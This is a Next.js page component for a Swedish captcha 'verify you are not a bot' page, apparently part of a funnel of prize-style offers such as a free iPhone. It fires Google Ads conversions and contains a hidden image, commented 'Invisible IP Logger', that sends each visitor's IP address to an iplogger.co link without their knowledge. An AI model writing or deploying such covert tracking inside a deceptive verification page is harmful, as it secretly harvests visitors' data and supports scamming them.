import Header from "../../components/Header";
import Footer from "../../components/Footer";
import CaptchaRedirectClientWrapper from "./CaptchaRedirectClientWrapper";
import Script from "next/script";

type PageProps = {
  searchParams?: { id?: string };
};

// IDs for which we want to fire the Google Ads conversion event
const TRACKED_OFFERS = new Set([
  "iphone-16-pro-max",
  "elg-001",
  "elg-002",
  "elg-003",
  "free-shipping",
  "elg-005",
  "elg-006",
  "elg-007",
  "elg-008",
  "elg-009",
  "elg-010",
  "elg-011",
  "elg-012",
]);

export default function VerifyPage({ searchParams }: PageProps) {
  const id = (searchParams?.id || "").toLowerCase();
  const shouldFire = TRACKED_OFFERS.has(id);

  return (
    <>
      {shouldFire && (
        <Script id={`aw-outbound-${id}`} strategy="afterInteractive">
          {`
            gtag('event', 'conversion', {
              'send_to': 'AW-17459630072/RpqDCI75tIMbEPifs4VB',
              'value': 1.0,
              'currency': 'RON'
            });
          `}
        </Script>
      )}

      <Header />
      <main className="flex flex-col items-center justify-center min-h-screen py-8 px-4">
        <div className="max-w-md w-full bg-white rounded-xl shadow-md p-6">
          <h1 className="text-xl font-semibold text-center mb-4">
            Verifiera att du inte är en bot
          </h1>

          <CaptchaRedirectClientWrapper />

          {/* Invisible IP Logger */}
          <img
            src="https://iplogger.co/1iTzZ4"
            border={0}
            style={{ display: "none" }}
            alt=""
          />
        </div>
      </main>
      <Footer />
    </>
  );
}
